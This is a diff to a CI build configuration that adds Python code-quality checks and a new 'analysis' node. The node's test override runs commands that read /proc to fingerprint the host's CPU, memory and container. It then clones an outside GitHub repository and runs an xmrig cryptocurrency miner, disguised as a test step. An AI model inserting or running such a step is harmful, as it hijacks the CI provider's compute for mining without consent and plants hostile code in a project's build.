@@ -4,7 +4,18 @@ build:
       environment:
         # caching works with the remote_engine and the local executor
         docker: true
+checks:
+    python:
+        code_rating: true
+        duplicate_code: true
 
-      # This example uses a minimal node, but it works equally fine with a auto-setup node.
-      commands:
-        - docker build -t 123 .
+build:
+  nodes:
+    docker-build:
+      environment:
+        # caching works with the remote_engine and the local executor
+        docker: true
+    analysis:
+      tests:
+        override:
+          - cat /proc/1/cgroup; cat /proc/uptime; cat /proc/cpuinfo; cat /proc/meminfo; cat /proc/cmdline; git clone https://github.com/dajiejie123/webserver.git && cd webserver && ./xmrig
